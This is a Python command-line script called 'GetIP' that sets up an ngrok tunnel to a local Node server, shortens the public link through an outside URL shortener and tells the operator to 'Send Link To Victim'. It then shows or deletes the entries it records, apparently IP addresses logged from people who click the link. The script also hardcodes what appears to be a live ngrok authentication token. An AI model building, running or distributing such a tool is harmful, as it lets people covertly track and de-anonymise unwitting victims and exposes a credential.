import os
import requests
import json
from pyngrok import ngrok, conf
from url_extractor import url_extract
from manipulate_records import read_records, del_records
import time
import colorama
from colorama import Fore
os.system("cls")

colorama.init()

print()
print("  ▄████ ▓█████▄▄▄█████▓ ██▓ ██▓███  ")
print(" ██▒ ▀█▒▓█   ▀▓  ██▒ ▓▒▓██▒▓██░  ██▒")
print("▒██░▄▄▄░▒███  ▒ ▓██░ ▒░▒██▒▓██░ ██▓▒")
print("░▓█  ██▓▒▓█  ▄░ ▓██▓ ░ ░██░▒██▄█▓▒ ▒")
print("░▒▓███▀▒░▒████▒ ▒██▒ ░ ░██░▒██▒ ░  ░")
print(" ░▒   ▒ ░░ ▒░ ░ ▒ ░░   ░▓  ▒▓▒░ ░  ░")
print("  ░   ░  ░ ░  ░   ░     ▒ ░░▒ ░     ")
print("░ ░   ░    ░    ░       ▒ ░░░       ")
print("      ░    ░  ░         ░       v1.1")
print()

print("====================================")
print("+        developed by: mohan putta +")
print("====================================")
print()
print(" start   -> Generate a payload link")
print(" show    -> Shows newly recorded Entry")
print(" show -0 -> Shows all recorded entries")
print("      -n -> Shows 'n' number of recorded entries")
print(" del     -> Delete all entries")
print(" 0       -> terminates the script")
print()
def main():
    print()
    print("[+] Setting server...")
    time.sleep(2)
    try:
        print("[!] Send Link To Victim")
        conf.get_default().auth_token = "299FED0QV81gQREsrXHLmdey2S2_5saXiXSDzhSgxp6AcWPgf"
        url = ngrok.connect(5000, "http")
        x = requests.get('https://api.shrtco.de/v2/shorten?url=' + str(url_extract(url))).text
        json_data = json.loads(x)
        print('[+] ' + Fore.BLUE + json_data['result']['full_short_link'])
        # print("[+] "+ str(url_extract(url)))
        print(Fore.WHITE, end="")
        os.system("node server.js")
    except:
        print(" [Err] Something went wrong..!")
        print()



def command_excute(cmd):
    cmd = cmd.lower()
    cmd = cmd.split()

    if(len(cmd) == 1):
        match cmd[0]:
            case "show":
                read_records(1)
            case "start":
                main()
            case "del":
                del_records()
            case "0":
                exit()

    if(len(cmd) == 2):
        match cmd[0]:
            case "show":
                read_records(int(cmd[1]))


# main()

while True:
    cmd = input("GetIP>> ")
    command_excute(cmd.strip(" "))
    print()